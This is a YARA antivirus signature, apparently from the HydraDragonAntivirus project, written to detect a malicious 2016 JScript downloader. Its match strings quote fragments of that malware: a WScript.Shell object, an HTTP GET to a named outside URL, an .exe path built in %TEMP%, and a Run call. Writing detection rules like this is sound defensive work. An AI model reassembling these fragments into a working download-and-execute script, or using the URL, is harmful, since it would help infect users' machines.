rule sig_20160401_b4b9b88242056496102eb5d7734fa385 {
  meta:
    description = "datamaliciousorder - file 20160401_b4b9b88242056496102eb5d7734fa385.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6058bade02d9b15883e1aa0fa6a4f95a57bd4f5774b20e0d858a4ecd8e4a09c0"

  strings:
    $s1  = "var AtuLuh = function ZedRs() {return WScript[NnyGse](\"WScript\"+\".Shell\");}(), UpxAvm = 11;" fullword ascii
    $s2  = "function ShaFbb(OlHah, JhZe){RlzJi = RlzJi * 1; return OlHah - JhZe;};" fullword ascii
    $s3  = "UkmCe[MajOq](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s4  = "if (UkmCe[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DswTra(){return UxsVox + \"\";};" fullword ascii
    $s6  = "function GktEl() {return AtuLuh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Dp4hmFkRkKjF.ex\" + \"e\";};" fullword ascii
    $s7  = "function TvZth() {return ((ChQv == true) && (ChQv == VvNta)) ? 1 : RlzJi;};" fullword ascii
    $s8  = "var WolTa = new this[\"Date\"]();" fullword ascii
    $s9  = "ChQv = true; " fullword ascii
    $s10 = "return ShaFbb(NqRe, ZusTm);" fullword ascii
    $s11 = "function DzEjj(){return NnyGse;};" fullword ascii
    $s12 = "function YzZv(ZeFsi){AtuLuh[\"R\"+\"un\"](ZeFsi, RlzJi, RlzJi);};" fullword ascii
    $s13 = "var VvNta = false;" fullword ascii
    $s14 = "function UkSp(){return 23;};" fullword ascii
    $s15 = "}while (OpxVln);" fullword ascii
    $s16 = "function HkzGc()" fullword ascii
    $s17 = "var ChQv = false;" fullword ascii
    $s18 = "var EyTf = false;" fullword ascii
    $s19 = "VvNta = true; " fullword ascii
    $s20 = "} catch(OrPg){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}